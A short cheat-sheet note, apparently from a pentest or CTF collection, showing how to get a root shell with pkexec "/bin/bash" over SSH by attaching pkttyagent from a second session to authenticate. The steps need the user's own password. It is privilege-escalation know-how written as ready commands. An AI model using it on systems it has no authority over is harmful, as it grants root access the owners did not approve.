Exploiting `pkexec` to escalate privileges <br>

*NOTE: you will need two SSH sessions running with the same user*

```
Session 1

# Step1: Get current PID
$ echo $$

# Step 3, execute pkexec
$ pkexec "/bin/bash"

# Step 5, if correctly authenticate, you will have a root session
```

```
Session 2

# Step 2, attach pkttyagent to session1
$ pkttyagent -p <PID of session1>

# Step 4, you will be asked in THIS session to authenticate to pkexec
```
